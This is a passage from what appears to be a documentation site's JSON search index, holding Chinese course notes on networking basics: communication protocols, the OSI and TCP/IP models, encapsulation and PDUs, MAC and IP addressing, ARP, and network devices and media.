\u7b2c2\u4e2a\u5c0f\u5b9e\u9a8c\uff1a\u65e0\u7ebf\u7f51\u7edc\u5b89\u5168\u6027\u914d\u7f6e\u5e94\u7528\u4e4bDMZ\u53ca\u8fc7\u6ee4\u5b9e\u9a8c</li> <li>\u5b9e\u9a8c\u4e94 \u7b2c3\u4e2a\u5c0f\u5b9e\u9a8c\uff1a\u65e0\u7ebfAP\u7ec4\u7f51\u4e4bBridge\u6865\u63a5\u6a21\u5f0f\u7ec4\u7f51\u5b9e\u9a8c</li> </ul> </li> <li>\u6a21\u5757\u7ec4\u8003\u8bd5(\u53d6\u6700\u9ad8\u5206) 20%</li> <li>\u671f\u672b\u8003\u8bd5 20%</li> </ul> <p>\u65e0\u654c\u597d\u8bfe\uff0c\u6709\u4e00\u70b9\u6280\u672f\u6c34\u5e73\u7684\u4eba\u90fd\u80fd\u62ff\u6ee1</p> <p>TBD\uff1a \u540e\u671f\u6709\u70b9\u6446\u4e86\uff0c\u7b14\u8bb0\u8fd8\u6ca1\u505a\u5b8c\ud83d\ude2d</p>"},{"location":"Courses/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A8%A1%E5%9E%8B/","title":"\u7f51\u7edc\u901a\u4fe1\u534f\u8bae\u4e0e\u7f51\u7edc\u6a21\u578b","text":""},{"location":"Courses/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A8%A1%E5%9E%8B/#_1","title":"\u7f51\u7edc\u901a\u4fe1\u534f\u8bae\u4e0e\u7f51\u7edc\u6a21\u578b","text":"<p> \u7ea6 1797 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 9 \u5206\u949f</p>"},{"location":"Courses/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A8%A1%E5%9E%8B/#_2","title":"\u7f51\u7edc\u901a\u4fe1\u534f\u8bae","text":"<p>\u901a\u4fe1\u7684\u4e09\u4e2a\u8981\u7d20\uff1a</p> <ul> <li>\u6e90 - \u5373\u53d1\u9001\u65b9\uff0c\u5411\u5176\u4ed6\u4eba\u6216\u8bbe\u5907\u53d1\u9001\u6d88\u606f</li> <li>\u901a\u9053 - \u7531\u4e3a\u6d88\u606f\u4ece\u6e90\u5730\u5740\u4f20\u9001\u5230\u76ee\u7684\u5730\u5740\u63d0\u4f9b\u8def\u5f84\u7684\u4ecb\u8d28\u7ec4\u6210</li> <li>\u76ee\u7684 - \u5373\u63a5\u6536\u65b9\uff0c\u63a5\u53d7\u5e76\u89e3\u91ca\u6d88\u606f</li> </ul> <p>\u6210\u529f\u7684\u8ba1\u7b97\u673a\u7f51\u7edc\u901a\u4fe1\u9700\u8981\u9075\u5b88\u4e00\u5b9a\u7684\u89c4\u5219\u6216\u534f\u8bae\uff0c\u8fd9\u4e9b\u901a\u4fe1\u534f\u8bae\u7531\u6d88\u606f\u7684\u6e90\u3001\u901a\u9053\u548c\u76ee\u7684\u7684\u7279\u6027\u51b3\u5b9a\uff0c\u6bd4\u5982\u4e0d\u540c\u7684\u901a\u9053\u91c7\u53d6\u4e0d\u540c\u7684\u534f\u8bae\u3002</p> <p>\u901a\u4fe1\u534f\u8bae\u5b9a\u4e49\u6d88\u606f\u4f20\u8f93\u548c\u4f20\u9012\u7684\u8be6\u7ec6\u65b9\u5f0f\uff0c\u5305\u62ec\u4e94\u4e2a\u65b9\u9762\uff1a</p> <ul> <li>\u6d88\u606f\u7f16\u7801<ul> <li>\u7f16\u7801\u662f\u53d1\u9001\u6d88\u606f\u540e\u6267\u884c\u7684\u7b2c\u4e00\u4e2a\u64cd\u4f5c\uff0c\u4e3a\u4e86\u65b9\u4fbf\u4f20\u8f93\uff0c\u7f16\u7801\u5668\u4f1a\u6839\u636e\u534f\u8bae\u5c06\u4fe1\u606f\u8f6c\u6362\u4e3a\u53e6\u4e00\u79cd\u53ef\u4f9b\u4f20\u8f93\u7684\u5f62\u5f0f</li> <li>\u89e3\u7801\u662f\u7f16\u7801\u7684\u9006\u5411\u8fc7\u7a0b\uff0c\u5176\u76ee\u7684\u662f\u8fd8\u539f\u4fe1\u606f</li> </ul> </li> <li>\u6d88\u606f\u683c\u5f0f\u4e0e\u5c01\u88c5<ul> <li>\u4e3a\u65b9\u4fbf\u4f20\u8f93\u548c\u5904\u7406\uff0c\u8ba1\u7b97\u673a\u7f51\u7edc\u901a\u4fe1\u6d88\u606f\u4e5f\u9700\u8981\u8fdb\u884c\u5c01\u88c5</li> <li>\u6bcf\u6761\u8ba1\u7b97\u673a\u6d88\u606f\u5728\u901a\u8fc7\u7f51\u7edc\u53d1\u9001\u4e4b\u524d\u90fd\u4ee5\u7279\u5b9a\u7684\u683c\u5f0f\u5c01\u88c5\uff0c\u79f0\u4e3a\u5e27 (Frame)</li> <li>\u5e27\u5c31\u50cf\u4fe1\u5c01\u4e00\u6837\uff0c \u5b83\u63d0\u4f9b\u76ee\u7684\u5730\u5740\u548c\u6e90\u5730\u5740\u7b49\u5fc5\u8981\u4fe1\u606f</li> </ul> </li> <li>\u6d88\u606f\u5927\u5c0f<ul> <li>\u5e27\u7684\u957f\u5ea6\u6709\u6240\u9650\u5236\uff0c\u6240\u4ee5\u9700\u8981\u5c06\u957f\u6d88\u606f\u5206\u5272\u6210\u7b26\u5408\u8981\u6c42\u7684\u591a\u4e2a\u5e27</li> <li>\u5982\u4ee5\u592a\u7f51\u5e27\uff1a 64~1518 \u5b57\u8282</li> </ul> </li> <li>\u6d88\u606f\u65f6\u5e8f<ul> <li>\u4e3b\u8981\u662f\u8bbf\u95ee\u65b9\u6cd5\u3001\u6d41\u91cf\u63a7\u5236\u548c\u54cd\u5e94\u8d85\u65f6</li> </ul> </li> <li>\u6d88\u606f\u4f20\u8f93\u9009\u9879\u6216\u6a21\u5f0f<ul> <li>\u4e00\u5bf9\u4e00\u4f20\u8f93\u9009\u9879\u79f0\u4e3a\u5355\u64ad</li> <li>\u4e00\u5bf9\u591a\u4f20\u8f93\u9009\u9879\u79f0\u4e3a\u7ec4\u64ad\u6216\u591a\u64ad</li> <li>\u4e00\u5bf9\u5168\u4f53\u4f20\u8f93\u9009\u9879\u79f0\u4e3a\u5e7f\u64ad</li> </ul> </li> </ul> <p>\u5e38\u7528\u7684\u7f51\u7edc\u4f20\u8f93\u534f\u8bae\u6709\u8d85\u6587\u672c\u4f20\u8f93\u534f\u8bae (HTTP) \u3001\u6587\u4ef6\u4f20\u8f93\u534f\u8bae (FTP) \u3001\u4f20\u8f93\u63a7\u5236\u534f\u8bae (TCP) \u3001Internet\u534f\u8bae (IP) </p> <p>\u6267\u884c\u67d0\u79cd\u901a\u4fe1\u529f\u80fd\u6240\u9700\u7684\u4e00\u7ec4\u5185\u5728\u76f8\u5173\u534f\u8bae\u79f0\u4e3a\u534f\u8bae\u65cf (\u534f\u8bae\u7c07\u6216\u534f\u8bae\u6808)\uff0c\u5176\u663e\u793a\u4e3a\u5206\u5c42\u7ed3\u6784\uff0c\u4e0a\u5c42\u670d\u52a1\u4f9d\u8d56\u4e8e\u4e0b\u5c42\u534f\u8bae\u7684\u529f\u80fd</p>"},{"location":"Courses/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A8%A1%E5%9E%8B/#_3","title":"\u7f51\u7edc\u5206\u5c42\u6a21\u578b","text":"<p>TCP/IP \u6a21\u578b \u548c \u5f00\u653e\u5f0f\u7cfb\u7edf\u4e92\u8054(OSI)\u6a21\u578b \u662f\u7814\u7a76\u548c\u8ba8\u8bba\u7f51\u7edc\u529f\u80fd\u65f6\u4f7f\u7528\u7684\u4e3b\u8981\u7684\u6a21\u578b\u548c\u901a\u7528\u8bed\u8a00\u3002</p> <p></p> <p>\u4f7f\u7528\u5206\u5c42\u6a21\u578b\u7684\u4f18\u70b9</p> <p>\u6709\u52a9\u4e8e\u534f\u8bae\u8bbe\u8ba1\uff1a\u5bf9\u5728\u7279\u5b9a\u5c42\u5de5\u4f5c\u7684\u534f\u8bae\u800c\u8a00\uff0c\u5176\u5de5\u4f5c\u65b9\u5f0f\u548c\u63a5\u53e3\u5747\u786e\u5b9a</p> <p>\u5176\u4e2d OSI \u6a21\u578b\u5404\u5c42\u529f\u80fd\u53ef\u4ee5\u770b\u4e0b\u56fe\u3002</p> <p></p> <p>\u800c TCP/IP \u6a21\u578b\u5c06\u51e0\u4e2a\u5982\u4eca\u529f\u80fd\u8fb9\u754c\u6bd4\u8f83\u6a21\u7cca\u7684\u5c42\u5408\u5e76\uff0c\u5b9a\u4e49\u4e86\u6210\u529f\u901a\u4fe1\u6240\u5fc5\u9700\u7684\u56db\u7c7b\u529f\u80fd\u3002</p>"},{"location":"Courses/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A8%A1%E5%9E%8B/#_4","title":"\u6570\u636e\u5c01\u88c5","text":"<p>\u6570\u636e\u5206\u6bb5\u53d1\u9001\u6709\u4e24\u4e2a\u4e3b\u8981\u597d\u5904:</p> <ul> <li>\u63d0\u9ad8\u901f\u5ea6\u00a0- \u7531\u4e8e\u5c06\u5927\u6570\u636e\u6d41\u5206\u6bb5\u6210\u4e3a\u6570\u636e\u5305\uff0c\u56e0\u6b64\u53ef\u4ee5\u5728\u4e0d\u72ec\u5360\u901a\u4fe1\u94fe\u8def\u7684\u60c5\u51b5\u4e0b\uff0c\u901a\u8fc7\u7f51\u7edc\u53d1\u9001\u5927\u91cf\u6570\u636e\u3002\u8fd9\u5141\u8bb8\u8bb8\u591a\u4e0d\u540c\u7684\u4f1a\u8bdd\u5728\u79f0\u4e3a\u591a\u8def\u590d\u7528\u7684\u7f51\u7edc\u4e0a\u4ea4\u9519\u3002</li> <li>\u63d0\u9ad8\u6548\u7387\u00a0- \u5982\u679c\u5355\u4e2a\u6570\u636e\u6bb5\u7531\u4e8e\u7f51\u7edc\u6545\u969c\u6216\u7f51\u7edc\u62e5\u585e\u800c\u65e0\u6cd5\u5230\u8fbe\u5176\u76ee\u7684\u5730\uff0c\u5219\u53ea\u9700\u8981\u91cd\u65b0\u4f20\u8f93\u8be5\u6bb5\uff0c\u800c\u4e0d\u9700\u8981\u91cd\u65b0\u53d1\u9001\u6574\u4e2a\u6570\u636e\u6d41\u3002</li> </ul> <p>TCP \u8d1f\u8d23\u5bf9\u5355\u72ec\u7684\u6570\u636e\u6bb5\u8fdb\u884c\u6392\u5e8f</p> <p>\u5728\u901a\u8fc7\u7f51\u7edc\u4ecb\u8d28\u4f20\u8f93\u5e94\u7528\u7a0b\u5e8f\u6570\u636e\u7684\u8fc7\u7a0b\u4e2d\uff0c\u968f\u7740\u6570\u636e\u6cbf\u534f\u8bae\u6808\u5411\u4e0b\u4f20\u9012\uff0c\u6bcf\u5c42\u90fd\u8981\u6dfb\u52a0\u5404\u79cd\u534f\u8bae\u4fe1\u606f\u3002\u6b64\u8fc7\u7a0b\u79f0\u4e3a \u5c01\u88c5</p> <p>\u4e00\u6bb5\u6570\u636e\u5728\u4efb\u610f\u534f\u8bae\u5c42\u7684\u8868\u793a\u5f62\u5f0f\u79f0\u4e3a\u534f\u8bae\u6570\u636e\u5355\u5143 (PDU)\u3002\u5728\u5c01\u88c5\u8fc7\u7a0b\u4e2d\uff0c\u540e\u7eed\u7684\u6bcf\u4e00\u5c42\u90fd\u6839\u636e\u4f7f\u7528\u7684\u534f\u8bae\u5c01\u88c5\u5176\u4ece\u4e0a\u4e00\u5c42\u63a5\u6536\u7684 PDU\u3002\u5728\u8be5\u8fc7\u7a0b\u7684\u6bcf\u4e2a\u9636\u6bb5\uff0cPDU \u90fd\u4ee5\u4e0d\u540c\u7684\u540d\u79f0\u6765\u53cd\u6620\u5176\u65b0\u529f\u80fd\u3002\u5c3d\u7ba1\u76ee\u524d\u5bf9 PDU \u7684\u547d\u540d\u6ca1\u6709\u901a\u7528\u7ea6\u5b9a\uff0c\u4f46\u672c\u8bfe\u7a0b\u4e2d\u6839\u636e TCP/IP \u534f\u8bae\u7c07\u7684\u534f\u8bae\u6765\u547d\u540d PDU\u3002\u56fe\u4e2d\u663e\u793a\u4e86\u6bcf\u79cd\u5f62\u5f0f\u6570\u636e\u7684 PDU\u3002</p> <p></p> <p>\u5176\u4e2d\u5404\u4e2a PDU \u4e00\u822c\u5bf9\u5e94 OSI \u534f\u8bae\u7c07\u4e2d\u5c42\u6570\u5982\u4e0b\uff1a</p> <ul> <li>\u6570\u636e - \u6cdb\u6307\u5e94\u7528\u5c42\u4f7f\u7528\u7684 PDU</li> <li>\u6570\u636e\u6bb5 - \u4f20\u8f93\u5c42 PDU</li> <li>\u6570\u636e\u5305 - \u7f51\u7edc\u5c42 PDU</li> <li>\u5e27 - \u6570\u636e\u94fe\u8def\u5c42 PDU</li> <li>\u4f4d - \u901a\u8fc7\u4ecb\u8d28\u5b9e\u9645\u4f20\u8f93\u6570\u636e\u65f6\u4f7f\u7528\u7684\u7269\u7406\u5c42 PDU (01\u4e32)</li> </ul> <p>\u5bf9\u5e94\u534f\u8bae\u5982\u4e0b</p> <p></p>"},{"location":"Courses/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A8%A1%E5%9E%8B/#_5","title":"\u6570\u636e\u8bbf\u95ee","text":"<p>IEEE</p> <p>\u5373\u7535\u6c14\u7535\u5b50\u5de5\u7a0b\u5e08\u534f\u4f1a\uff0c\u8d1f\u8d23\u7ef4\u62a4\u7f51\u7edc\u6807\u51c6\uff0c\u5305\u62ec\u4ee5\u592a\u7f51\u548c\u65e0\u7ebf\u6807\u51c6\u7b49\uff0c\u6bcf\u9879\u6280\u672f\u6807\u51c6\u90fd\u6709\u5176\u7f16\u53f7\uff0c\u6307\u4ee3\u8d1f\u8d23\u8be5\u6807\u51c6\u7684\u59d4\u5458\u4f1a</p> <p>\u5982\u4ee5\u592a\u7f51\u4e3a 802.3\uff0c\u65e0\u7ebf\u5c40\u57df\u7f51\u4e3a 802.11(802.11ac=WiFi 5,802.11ax=WiFi6, 802.11be=WiFi7)</p> <p>\u7f51\u7edc\u5c42\u548c\u6570\u636e\u94fe\u8def\u5c42\u8d1f\u8d23\u5c06\u6570\u636e\u4ece\u6e90\u8bbe\u5907\u4f20\u8f93\u5230\u76ee\u7684\u8bbe\u5907\uff0c\u4e24\u5c42\u4e2d\u7684\u534f\u8bae\u90fd\u5305\u542b\u6e90\u5730\u5740\u548c\u76ee\u7684\u5730\u5740\uff0c\u4f46\u5b83\u4eec\u7684\u5730\u5740\u5177\u6709\u4e0d\u540c\u7684\u7528\u9014\u3002</p> <ul> <li>\u7f51\u7edc\u5c42\u6e90\u5730\u5740\u548c\u76ee\u7684\u5730\u5740<ul> <li>\u8d1f\u8d23\u5c06 IP \u6570\u636e\u5305\u4ece\u539f\u59cb\u6e90\u8bbe\u5907\u4f20\u8f93\u5230\u53ef\u80fd\u5904\u4e8e\u540c\u4e00\u7f51\u7edc\u6216\u8fdc\u7a0b\u7f51\u7edc\u4e2d\u7684\u6700\u7ec8\u76ee\u7684\u8bbe\u5907\u3002</li> <li>\u5373 IP \u5730\u5740\uff0c\u5171 32 bit</li> </ul> </li> <li>\u6570\u636e\u94fe\u8def\u5c42\u6e90\u5730\u5740\u548c\u76ee\u7684\u5730\u5740<ul> <li>\u8d1f\u8d23\u5c06\u6570\u636e\u94fe\u8def\u5e27\u4ece\u4e00\u4e2a\u7f51\u7edc\u63a5\u53e3\u5361 (NIC) \u4f20\u8f93\u5230\u540c\u4e00\u7f51\u7edc\u4e0a\u7684\u53e6\u4e00\u4e2a NIC\u3002</li> <li>\u5373 MAC \u5730\u5740\uff0c\u5171 48 bit</li> </ul> </li> </ul> <p>\u4f7f\u7528\u547d\u4ee4 <code>ipconfig /all</code> \u67e5\u770b\u7535\u8111\u4e0a\u7f51\u5361\u7684 MAC \u5730\u5740\u53ca IP \u5730\u5740</p> <p>\u6211\u4eec\u4ec5\u5206\u6790\u4e0b\u56fe\u4f8b\u5b50\uff1a</p> <p>\u5176\u4e2d\uff0c\u5e27\u5934\u5b58\u653e\u6570\u636e\u53d1\u9001\u7684\u76ee\u7684 MAC \u5730\u5740\u4ee5\u53ca\u6e90 MAC \u5730\u5740\uff0c\u636e\u56fe\u53ef\u77e5\u8be5\u6570\u636e\u4ece PC1 \u7684\u7f51\u5361\u53d1\u9001\u5230\u4ea4\u6362\u673a\u8fde\u63a5\u7684\u8def\u7531\u5668 R1 \u7684\u7f51\u5361\u4e0a\u3002</p> <p>\u6570\u636e\u5230\u8fbe\u8def\u7531\u5668 R1 \uff0c\u5b83\u4f1a\u88ab\u8def\u7531\u5668\u89e3\u5305\u6700\u5916\u5c42\u5e27\u5934\uff0c\u4ee5\u67e5\u770b\u5185\u90e8\u76ee\u7684\u7f51\u7edc IP \u5730\u5740\uff1b\u5728\u5c06\u6570\u636e\u8f6c\u53d1\u7ed9\u5176\u5b83\u8def\u7531\u5668\u4e4b\u524d\uff0cR1 \u4f1a\u91cd\u65b0\u5c01\u88c5\u4e00\u4e2a\u5e27\u5934\uff0c\u5176\u4e2d\u6e90 MAC \u5730\u5740\u4e3a R1 \u7684\u7f51\u5361\u5730\u5740\uff0c\u76ee\u7684 MAC \u5730\u5740\u4e3a\u8981\u8f6c\u53d1\u7684\u8def\u7531\u5668\u7684\u7f51\u5361\u7684 MAC \u5730\u5740</p> <p>\u540c\u7406\uff0c\u5728\u4e2d\u95f4\u5c42\u7ecf\u8fc7\u7684\u6bcf\u4e00\u4e2a\u8def\u7531\u5668\u90fd\u4f1a\u6539\u53d8\u8be5\u6570\u636e\u7684\u5e27\uff0c\u6700\u540e\u5230\u8fbe\u76ee\u7684 IP \u5730\u5740\u7684\u7f51\u7edc\uff0c\u7531\u8be5\u7f51\u7edc\u7684\u4ea4\u6362\u673a\u8d1f\u8d23\u8f6c\u53d1\u6d88\u606f</p> <p></p> <p>ARP \u534f\u8bae</p> <p>\u5728\u672c\u5730\u7f51\u7edc\u4e2d\uff0c\u4ec5\u5f53\u5e27\u6240\u5305\u542b\u7684\u76ee\u7684 MAC \u5730\u5740\u4e0e\u67d0\u4e3b\u673a MAC \u5730\u5740\u76f8\u540c\u6216\u4e3a\u5e7f\u64ad MAC \u5730\u5740\u65f6\uff0c\u8be5\u4e3b\u673a\u624d\u4f1a\u63a5\u53d7\u8be5\u5e27\uff0c\u4f46\u7f51\u7edc\u5e94\u7528\u5e38\u5e38\u4ec5\u901a\u8fc7\u76ee\u7684 IP \u5730\u5740\u6765\u627e\u5230\u76ee\u6807\uff0c\u6545\u9700\u8981 ARP \u534f\u8bae\u6765\u53d1\u73b0\u540c\u4e00\u672c\u5730\u7f51\u7edc\u4e2d\u5df2\u77e5 IP \u5730\u5740\u7684\u4efb\u610f\u4e3b\u673a\u7684 MAC \u5730\u5740</p> <p>ARP \u534f\u8bae\u53d1\u73b0\u548c\u5b58\u50a8\u4e3b\u673a MAC \u5730\u5740\u5206\u4e3a\u4e09\u4e2a\u6b65\u9aa4\uff1a</p> <ol> <li>\u53d1\u9001\u4e3b\u673a\u521b\u5efa\u5e76\u53d1\u9001\u4e00\u4e2a\u5e7f\u64ad\u5e27\uff0c\u8be5\u5e27\u7684\u76ee\u7684\u5730\u5740\u4e3a\u5e7f\u64ad MAC \u5730\u5740\uff0c\u6570\u636e\u5305\u4e2d\u542b\u6709\u60f3\u77e5\u9053\u7684\u76ee\u7684\u4e3b\u673a\u7684 IP \u5730\u5740</li> <li>\u7f51\u7edc\u4e2d\u6bcf\u53f0\u4e3b\u673a\u90fd\u4f1a\u6536\u5230\u8be5\u5e7f\u64ad\u5e27\uff0c\u5e76\u5c06\u6d88\u606f\u4e2d IP \u5730\u5740\u4e0e\u81ea\u5df1\u6bd4\u8f83\uff0c\u5982\u679c\u5339\u914d\uff0c\u5219\u5c06\u81ea\u5df1\u7684 MAC \u5730\u5740\u4f20\u56de\u539f\u59cb\u53d1\u9001\u4e3b\u673a</li> <li>\u53d1\u9001\u4e3b\u673a\u6536\u5230\u56de\u9001\u6d88\u606f\u540e\uff0c\u5c06\u8be5 MAC \u5730\u5740\u4e0e IP \u5730\u5740\u4fe1\u606f\u6210\u5bf9\u4fdd\u5b58\u5728 ARP \u8868\u4e2d\uff0c\u4ee5\u540e\u518d\u5bf9\u540c\u4e00 IP \u8bf7\u6c42\uff0c\u5c31\u4e0d\u518d\u9700\u8981\u53d1\u51fa ARP \u8bf7\u6c42\u4e86</li> </ol>"},{"location":"Courses/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/%E5%BD%93%E4%BB%8A%E7%BD%91%E7%BB%9C/","title":"\u5f53\u4eca\u7f51\u7edc","text":""},{"location":"Courses/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/%E5%BD%93%E4%BB%8A%E7%BD%91%E7%BB%9C/#_1","title":"\u5f53\u4eca\u7f51\u7edc","text":"<p> \u7ea6 1691 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f</p>"},{"location":"Courses/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/%E5%BD%93%E4%BB%8A%E7%BD%91%E7%BB%9C/#_2","title":"\u7f51\u7edc\u7ec4\u4ef6","text":"<p>\u7f51\u7edc\u57fa\u7840\u8bbe\u65bd\u5305\u62ec\u4e09\u7c7b\u7f51\u7edc\u7ec4\u4ef6\uff1a</p> <ol> <li>\u8bbe\u5907</li> <li>\u4ecb\u8d28</li> <li>\u670d\u52a1</li> </ol> <p>\u5176\u4e2d\uff0c\u8bbe\u5907\u4e0e\u4ecb\u8d28\u662f\u7f51\u7edc\u7684\u7269\u7406\u8981\u7d20\uff0c\u5373\u786c\u4ef6\u3002\u786c\u4ef6\u901a\u5e38\u662f\u7f51\u7edc\u5e73\u53f0\u7684\u53ef\u89c1\u7ec4\u6210\u90e8\u5206\uff0c\u5982\u7b14\u8bb0\u672c\u7535\u8111\u3001PC\u3001\u4ea4\u6362\u673a\u3001\u8def\u7531\u5668\u3001\u6216\u7528\u4e8e\u8fde\u63a5\u8bbe\u5907\u7684\u7535\u7f06\u7b49</p>"},{"location":"Courses/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/%E5%BD%93%E4%BB%8A%E7%BD%91%E7%BB%9C/#_3","title":"\u7f51\u7edc\u8bbe\u5907","text":"<p>\u6211\u4eec\u79f0\u7f51\u7edc\u4f20\u8f93\u7684\u6d88\u606f\u7684\u6e90\u6216\u76ee\u7684\u5730\u4e3a \u7ec8\u7aef\u8bbe\u5907 \uff0c\u5982\u8ba1\u7b97\u673a\u3001\u6253\u5370\u673a\u3001\u7535\u8bdd\u7b49</p> <p>\u4e3a\u4e86\u533a\u5206\u4e0d\u540c\u7684\u7ec8\u7aef\u8bbe\u5907\uff0c\u7f51\u7edc\u4e2d\u7684\u6bcf\u53f0\u7ec8\u7aef\u8bbe\u5907\u90fd\u7528\u4e00\u4e2a\u5730\u5740\u52a0\u4ee5\u6807\u8bc6\u3002\u5f53\u4e00\u53f0\u7ec8\u7aef\u8bbe\u5907\u53d1\u8d77\u901a\u4fe1\u65f6\uff0c\u4f1a\u4f7f\u7528\u76ee\u7684\u7ec8\u7aef\u8bbe\u5907\u7684\u5730\u5740\u6765\u6307\u5b9a\u5e94\u8be5\u5c06\u6d88\u606f\u53d1\u9001\u5230\u54ea\u91cc</p> <p>\u800c \u4e2d\u95f4\u8bbe\u5907 \u5219\u8d1f\u8d23\u5c06\u6bcf\u53f0\u7ec8\u7aef\u8bbe\u5907\u8fde\u63a5\u5230\u7f51\u7edc\uff0c\u5e76\u4e14\u53ef\u4ee5\u5c06\u591a\u4e2a\u72ec\u7acb\u7684\u7f51\u7edc\u8fde\u63a5\u6210\u56fd\u9645\u7f51\u7edc\uff0c\u786e\u4fdd\u6570\u636e\u5728\u7f51\u7edc\u4e2d\u4f20\u8f93\uff0c\u5982\u8def\u7531\u5668\u3001\u4ea4\u6362\u673a\u3001\u9632\u706b\u5899\u8bbe\u5907\u7b49</p> <p></p> <p>\u5bf9\u7b49\u7f51\u7edc</p> <p>\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u8f6f\u4ef6\u901a\u5e38\u8fd0\u884c\u5728\u5355\u72ec\u7684\u670d\u52a1\u5668\u4e0a\uff0c\u4f46\u4e00\u53f0\u8ba1\u7b97\u673a\u4e5f\u53ef\u4ee5\u540c\u65f6\u517c\u4efb\u4e24\u4e2a\u89d2\u8272\u3002\u5728\u5c0f\u4f01\u4e1a\u548c\u5bb6\u5ead\u4e2d\uff0c\u8bb8\u591a\u8ba1\u7b97\u673a\u5728\u7f51\u7edc\u4e2d\u65e2\u662f\u670d\u52a1\u5668\u53c8\u662f\u5ba2\u6237\u7aef\u3002\u8fd9\u79cd\u7f51\u7edc\u79f0\u4e3a\u5bf9\u7b49\u7f51\u7edc\u3002</p> <p>\u5bf9\u7b49\u7f51\u7edc\u7684\u4f18\u70b9\uff1a</p> <ul> <li>\u6613\u4e8e\u5b89\u88c5</li> <li>\u590d\u6742\u6027\u4f4e</li> <li>\u6210\u672c\u66f4\u4f4e\uff0c\u56e0\u4e3a\u53ef\u80fd\u4e0d\u9700\u8981\u7f51\u7edc\u8bbe\u5907\u548c\u4e13\u7528\u670d\u52a1\u5668</li> <li>\u53ef\u7528\u4e8e\u7b80\u5355\u7684\u4efb\u52a1\uff0c\u4f8b\u5982\u4f20\u8f93\u6587\u4ef6\u548c\u5171\u4eab\u6253\u5370\u673a</li> </ul> <p>\u5bf9\u7b49\u7f51\u7edc\u7684\u7f3a\u70b9\uff1a</p> <ul> <li>\u65e0\u96c6\u4e2d\u7ba1\u7406</li> <li>\u4e0d\u662f\u5f88\u5b89\u5168</li> <li>\u4e0d\u53ef\u6269\u5c55</li> <li>\u6240\u6709\u8bbe\u5907\u7686\u53ef\u7528\u4f5c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\uff0c\u8fd9\u4f1a\u964d\u4f4e\u5176\u6027\u80fd</li> </ul>"},{"location":"Courses/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/%E5%BD%93%E4%BB%8A%E7%BD%91%E7%BB%9C/#_4","title":"\u7f51\u7edc\u4ecb\u8d28","text":"<p>\u4ecb\u8d28 \u4e3a\u6d88\u606f\u4ece\u6e90\u8bbe\u5907\u4f20\u9001\u5230\u76ee\u7684\u8bbe\u5907\u63d0\u4f9b\u4e86\u901a\u9053\u3002\u73b0\u4ee3\u7f51\u7edc\u4e3b\u8981\u901a\u8fc7\u4e0b\u5217\u4e09\u79cd\u4ecb\u8d28\u6765\u8fde\u63a5\u8bbe\u5907\uff0c\u5e76\u63d0\u4f9b\u4f20\u8f93\u6570\u636e\u7684\u9014\u5f84\uff1a</p> <ul> <li>\u7535\u7f06\u5185\u7684\u91d1\u5c5e\u7ebf (\u7f51\u7ebf\u6216\u540c\u8f74\u7535\u7f06)<ul> <li>\u6570\u636e\u5c06\u7f16\u7801\u4e3a\u7535\u8109\u51b2</li> </ul> </li> <li>\u73bb\u7483\u5149\u7ea4\u6216\u5851\u6599\u5149\u7ea4<ul> <li>\u6570\u636e\u5c06\u7f16\u7801\u4e3a\u5149\u8109\u51b2</li> </ul> </li> <li>\u65e0\u7ebf (\u7535\u6ce2)<ul> <li>\u6570\u636e\u5c06\u7f16\u7801\u4e3a\u7535\u78c1\u6ce2\u4fe1\u53f7</li> </ul> </li> </ul> <p>\u4e0d\u540c\u7c7b\u578b\u7684\u4ecb\u8d28\u6709\u4e0d\u540c\u7684\u7279\u6027\u3001\u4f18\u70b9\u548c\u7528\u9014</p> <p></p>"},{"location":"Courses/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/%E5%BD%93%E4%BB%8A%E7%BD%91%E7%BB%9C/#_5","title":"\u7f51\u7edc\u670d\u52a1","text":"<p>\u7f51\u7edc\u7ec4\u4ef6\u7528\u4e8e\u63d0\u4f9b\u670d\u52a1\u548c\u8fc7\u7a0b\u3002\u670d\u52a1\u548c\u8fc7\u7a0b\u662f\u7f51\u7edc\u8bbe\u5907\u4e0a\u8fd0\u884c\u7684\u901a\u4fe1\u7a0b\u5e8f\uff0c\u79f0\u4e3a\u8f6f\u4ef6\u3002</p> <ul> <li>\u670d\u52a1\u5305\u62ec\u4eba\u4eec\u65e5\u5e38\u4f7f\u7528\u7684\u8bb8\u591a\u5e38\u89c1\u7f51\u7edc\u5e94\u7528\u7a0b\u5e8f\u3002\u5982\u7535\u5b50\u90ae\u4ef6\u6258\u7ba1\u670d\u52a1\u548c Web \u6258\u7ba1\u670d\u52a1\u3002</li> 